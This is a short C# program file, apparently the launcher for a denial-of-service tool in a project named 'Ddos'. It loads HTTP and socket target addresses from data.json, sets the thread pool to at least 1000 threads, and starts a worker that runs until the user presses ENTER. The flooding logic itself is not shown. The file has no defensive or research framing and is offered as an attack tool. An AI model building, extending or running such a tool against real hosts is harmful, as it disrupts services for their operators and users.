using System.IO.Enumeration;
using System.Reflection;
using System.Text.Json;
using Ddos;
using Ddos.Models;

const string filename = "data.json";

string fullname = Path.Combine(Path.GetDirectoryName(Assembly.GetAssembly(typeof(Worker)).Location), filename);

if (!File.Exists(fullname))
{
    Console.WriteLine($"File {fullname} is not exist");
    return;
}

var content = await File.OpenText(fullname).ReadToEndAsync();

var addresses = JsonSerializer.Deserialize<Addresses>(content);

if (addresses == null || (!addresses.Http.Any() && !addresses.Sockets.Any())) 
{
    Console.WriteLine("The content is empty.");
    return;
}

ThreadPool.SetMinThreads(1000, 10);

var cancellationTokenSource = new CancellationTokenSource();
var worker = new Worker(addresses, cancellationTokenSource.Token);

var workThread = new Thread(worker.DoWork);
workThread.Start();

Console.WriteLine("Press ENTER to stop...");
Console.ReadLine();
cancellationTokenSource.Cancel();


